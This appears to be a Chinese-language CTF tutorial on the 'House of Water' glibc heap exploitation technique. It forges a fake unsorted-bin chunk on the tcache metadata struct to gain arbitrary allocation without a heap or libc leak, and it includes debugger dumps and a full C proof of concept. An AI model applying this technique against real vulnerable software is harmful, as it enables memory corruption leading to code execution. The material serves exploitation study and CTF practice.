~~神秘妙妙大🏠~~

## 原理

### TL;DR

总的来说，这个打法的应用场景是在：
- fastbin / tcachebin 有指针加密
- 程序没有 show 来 leak libc or heap_base
- 程序至少可以 uaf

由于没有 show，所以得打 `stdout/stderr` 这些，所以得 fastbin attack 或者 tcache posioning 来实现任意地址分配，但是这些打法无一例外需要泄漏 heap_base（高版本存在指针加密），当然如果低版本没有指针加密的话，可以通过 uaf 打堆块重叠之类的做到任意地址分配。

回到这个手法，核心思想是通过伪造一个在 tcache_pthread_struct 上的 fake_unsortbin 来实现任意地址分配，这个过程中最多只需要 1/16 的爆破，不需要其他任何的地址泄漏等等。

### 具体手法

#### step1

分配 0x3d8 和 0x3e8 大小的 chunk，以将其各自的 t-cache 计数设置为 1，此时 tcache_pthread_struct + 0x78 位置会被写入一个 0x10001，这是因为 tps 的 idx 字段是 int 的，效果如下：

```
tcache is pointing to: 0x555555559010 for thread 1
{
counts = {0 <repeats 60 times>, 1, 1, 0, 0},
entries = {0x0 <repeats 60 times>, 0x5555555592a0, 0x555555559680, 0x0, 0x0}
}

0x555555559000: 0x0000000000000000      0x0000000000000291
0x555555559010: 0x0000000000000000      0x0000000000000000
0x555555559020: 0x0000000000000000      0x0000000000000000
0x555555559030: 0x0000000000000000      0x0000000000000000
0x555555559040: 0x0000000000000000      0x0000000000000000
0x555555559050: 0x0000000000000000      0x0000000000000000
0x555555559060: 0x0000000000000000      0x0000000000000000
0x555555559070: 0x0000000000000000      0x0000000000000000
0x555555559080: 0x0000000000000000      0x0000000000010001  <- fake_chunk
```

然后我们分配 7 个 0x88 的 chunk 用于后面填充 tcachebin。

#### step2

分配 3 个 ub，中间用 gap 隔开。

```c
void *unsorted_start = malloc(0x88);
_ = malloc(0x18); // Guard chunk

void *unsorted_middle = malloc(0x88);
_ = malloc(0x18); // Guard chunk

void *unsorted_end = malloc(0x88);
_ = malloc(0x18); // Guard chunk
```


#### step3

接下来，我们要通过一些办法让堆管理器认为 fake_chunk 是 free 的，这需要我们把 `fake_chunk + 0x10000` 处的 `prev_size` 和 `size` 字段的 `pre_inuse` 位设置好。

```c
_ = malloc(0xf000);		  // Padding
void *end_of_fake = malloc(0x18); // Metadata chunk
*(long *)end_of_fake = 0x10000;
*(long *)(end_of_fake+0x8) = 0x20;
```

大概这样设置一下。

#### step4

把 step1 里申请的 0x90 的 7 个 chunk 释放掉，填满对应的 tcache idx。

#### step5

接下来到了最关键的部分，为了将 fakechunk 伪造成一个合法的 unsortbin，需要伪造它的 fd bk 字段，可以注意到我们申请出来 0x10001 的相对偏移是 `0x88`，而偏移为 `0x90` 处（对应 fd）正好是大小为 0x20 的 tcachebin chunk 的 record，`0x98` 处（对应 bk）正好是大小为 0x30 的 tcachebin chunk 的 record。

然后还要注意一个点：tcachebin 记录的是返回给用户的 chunkptr，而其他 bins(unsortbin) 记录的就是申请出来的 chunk 头。

所以我们可以往刚刚申请的 unsortbin chunk 头前伪造一个合法的 size 字段，做到释放与 unsorted_start 和 unsorte_end 块的头完全重叠的块。

```c
*(long*)(unsorted_start - 0x18) = 0x31;
free(unsorted_start - 0x10); // Create a fake fd pointer for the fake chunk
*(long*)(unsorted_start - 0x8) = 0x91;

*(long*)(unsorted_end - 0x18) = 0x21; // Write 0x21 above unsorted_end
free(unsorted_end - 0x10); // Create a fake bk for the fake chunk
*(long*)(unsorted_end - 0x8) = 0x91;	// recover the original header
```

`unsorted_start` 大概如下，`unsorted_end` 类似。
```
0x555555559e40: 0x0000000000000000      0x0000000000000031
0x555555559e50: 0x0000000555555559      0x0000000000000091
0x555555559e60: 0x0000000000000000      0x0000000000000000
```

最终效果如下：

```
0x555555559080: 0x0000000000000000      0x0000000000010001
0x555555559090: 0x0000555555559fb0      0x0000555555559e50
0x5555555590a0: 0x0000000000000000      0x0000000000000000
```

这是一个比较合法的 unsortbin chunk，接下来只要想办法把他挂到 unsortbin 链子里就行。

#### step6

释放 3 个 unsortbin chunk，效果如下：

```
unsortedbin
all: 0x555555559e50 —▸ 0x555555559f00 —▸ 0x555555559fb0 —▸ 0x7ffff7e03b20 (main_arena+96) ◂— 0x555555559e50
```

现在只需要把这个链子里的 `0x555555559f00` 改成 `0x555555559080` 就可以。

#### step7

这里就需要用到 uaf，利用题目漏洞 edit / 部分写 `0x555555559f00` 为 `0x555555559080`，这里只需要一个 1/16 的爆破。

具体是修改 `unsorted_start` 的 `fd` 和 `unsorted_end` 的 `bk`。

```
unsortedbin
all: 0x555555559e50 —▸ 0x555555559080 —▸ 0x555555559fb0 —▸ 0x7ffff7e03b20 (main_arena+96) ◂— 0x555555559e50
```

#### step8

接下来任意申请一个小于 0x10000 的 chunk 就可以完成攻击了。


### 效果

相当于可以控制部分的 tcache_pthread_plus 了，这里就可以任意地址申请了。

同时 tps 的 0x20 和 0x30 的地方会写入 main_arena 的 libc 值，这里可以任意申请 libc 了。


完整 Poc：

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    void *fake_size_lsb = malloc(0x3d8);
    void *fake_size_msb = malloc(0x3e8);

    free(fake_size_lsb);
    free(fake_size_msb);
    void *metadata = (void *)((long)(fake_size_lsb) & ~(0xfff));
    void *x[7];
    for (int i = 0; i < 7; i++) {
        x[i] = malloc(0x88);
    }
    void *_ = 0;
    void *unsorted_start = malloc(0x88);
    _ = malloc(0x18); // Guard chunk

    void *unsorted_middle = malloc(0x88);
    _ = malloc(0x18); // Guard chunk

    void *unsorted_end = malloc(0x88);
    _ = malloc(0x18); // Guard chunk

    _ = malloc(0xf000);		  // Padding
    void *end_of_fake = malloc(0x18); // Metadata chunk
    *(long *)end_of_fake = 0x10000;
    *(long *)(end_of_fake + 8) = 0x20;


    for (int i = 0; i < 7; ++i) {
        free(x[i]);
    }


    *(long*)(unsorted_start - 0x18) = 0x31;
    free(unsorted_start - 0x10); // Create a fake fd pointer for the fake chunk
    *(long*)(unsorted_start - 0x8) = 0x91;

    *(long*)(unsorted_end - 0x18) = 0x21; // Write 0x21 above unsorted_end
    free(unsorted_end - 0x10); // Create a fake bk for the fake chunk
    *(long*)(unsorted_end - 0x8) = 0x91;	// recover the original header

    free(unsorted_end);
    free(unsorted_middle);
    free(unsorted_start);

    /* VULNERABILITY */
    *(unsigned long *)unsorted_start = (unsigned long)(metadata+0x80);
    *(unsigned long *)(unsorted_end+0x8) = (unsigned long)(metadata+0x80);

    malloc(0x288);
    return 0;
}
```


- 参考文章：https://4xura.com/pwn/house-of-water/